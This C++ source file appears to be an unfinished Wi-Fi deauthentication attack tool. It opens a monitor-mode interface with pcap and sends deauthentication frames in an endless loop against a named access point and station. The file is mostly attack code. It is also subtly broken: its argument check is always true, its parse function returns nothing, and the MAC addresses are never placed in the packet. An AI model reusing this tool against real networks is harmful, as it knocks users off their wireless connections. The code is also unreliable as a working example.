#include <iostream>
#include <vector>
#include <string>
#include <stdio.h>
#include <header.h>

void usage()
{
    std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]" << std::endl;
    std::cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
}

struct Param {
	bool auth{false};

	bool parse(int argc, char* argv[]) {
		for (int i = 1; i < argc; i++) {
			if (strcmp(argv[i], "-auth") == 0) {
				auth = true;
				continue;
			}
		}
	}
} param;

int main(int argc, char *argv[])
{
    if(argc != 4 || argc != 5) {
        usage();
        return 0;
    }

    char* interface = argv[1];
    char* ap_mac = argv[2];
    char* sta_mac = argv[3];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
            return -1;
    }

    Deauth_packet packet;

    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(Deauth_packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(1);
    }

    pcap_close(handle);

    return 0;
}
